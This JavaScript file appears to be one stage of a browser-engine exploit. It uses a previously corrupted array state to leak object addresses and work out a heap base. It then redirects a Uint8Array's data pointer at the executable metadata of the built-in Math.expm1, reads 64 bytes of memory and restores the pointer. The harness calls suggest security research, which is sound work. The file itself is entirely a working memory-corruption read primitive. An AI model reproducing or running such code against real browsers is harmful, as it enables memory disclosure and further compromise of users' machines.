// Redirect an owned ordinary Uint8Array at one live built-in's observed
// executable-metadata pointer, read 64 bytes, then restore its data pointer.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
var slot = -1;
var original = [];
var viewChanged = false;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.ownedTypedView ||
      !state.otherTypedView || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_views_preflight_failed");
  var forged = state.view;
  var a = state.ownedTypedView;
  var b = state.otherTypedView;
  if (a.length !== 65536 || b.length !== 65536 ||
      a[0] !== 0x31 || a[7] !== 0xa8 || b[0] !== 0x42)
    throw new Error("owned_canary_mismatch");
  function matches(at, value) {
    return forged[at] === (value & 255) &&
      forged[at + 1] === (value >>> 8 & 255) &&
      forged[at + 2] === (value >>> 16 & 255) &&
      forged[at + 3] === (value >>> 24 & 255);
  }
  function bytesAt(at) {
    var bytes = [];
    for (var n = 0; n < 8; n++) bytes.push(forged[at + n]);
    return bytes;
  }
  function hex(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var n = 0; n < 8; n++) bytes.push(forged[state.index + n]);
    } finally {
      state.array[0] = state.a;
    }
    return hex(bytes);
  }
  var anchorWord = wordOf(state.addressAnchor);
  var candidates = [];
  for (var i = 2097152; i + 3 < 4194304; i++)
    if (matches(i, 0x11223344)) {
      if (candidates.length === 32) throw new Error("anchor_candidates_capped");
      candidates.push(i);
    }
  var live = [];
  try {
    state.addressAnchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) live.push(candidates[c]);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (live.length !== 1 || !matches(live[0], 0x11223344))
    throw new Error("anchor_live_count_" + live.length);
  var base = Number(anchorWord) + 8 - live[0];
  if (!Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("base_not_page_aligned");
  phase = "pointer_gate";
  var aWord = wordOf(a);
  var aIndex = Number(aWord) - base;
  var expWord = wordOf(Math.expm1);
  var expIndex = Number(expWord) - base;
  if (!Number.isSafeInteger(aIndex) || !Number.isSafeInteger(expIndex) ||
      aIndex < 0 || expIndex < 0 ||
      aIndex + 15 >= 16777216 || expIndex + 23 >= 4194304)
    throw new Error("cells_outside_window");
  slot = aIndex + 8;
  original = bytesAt(slot);
  var candidateBytes = bytesAt(expIndex + 16);
  var candidate = Number(hex(candidateBytes));
  if (!Number.isSafeInteger(candidate) || candidate <= 0 ||
      candidate >= base || candidate % 8 !== 0 ||
      Math.abs(Math.expm1(1) - 1.718281828459045) > 1e-12)
    throw new Error("metadata_pointer_gate_failed");
  if (api && typeof api.markSync === "function")
    api.markSync("builtin_metadata_before_read");
  phase = "metadata_read";
  var metadata = "";
  var viewRestored = false;
  viewChanged = true;
  try {
    for (var w = 0; w < 8; w++) forged[slot + w] = candidateBytes[w];
    for (var r = 0; r < 64; r++)
      metadata += a[r].toString(16).padStart(2, "0");
    if (api && typeof api.markSync === "function")
      api.markSync("builtin_metadata_read_complete");
  } finally {
    for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
    viewChanged = false;
    viewRestored = hex(bytesAt(slot)) === hex(original) &&
      a[0] === 0x31 && a[7] === 0xa8 && b[0] === 0x42 &&
      state.array[0] === state.a;
  }
  if (api && typeof api.markSync === "function")
    api.markSync("builtin_metadata_restored");
  result = { id: "builtin_metadata_read",
    status: metadata.length === 128 && viewRestored ? "pass" : "fail",
    details: { base: "0x" + base.toString(16),
      typed_word: aWord, typed_data: hex(original),
      expm1_word: expWord, metadata_pointer: hex(candidateBytes),
      metadata_hex: metadata, bytes_read: metadata.length / 2,
      view_restored: viewRestored } };
} catch (error) {
  if (viewChanged && state && state.view && original.length === 8 && slot >= 0)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "builtin_metadata_read", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
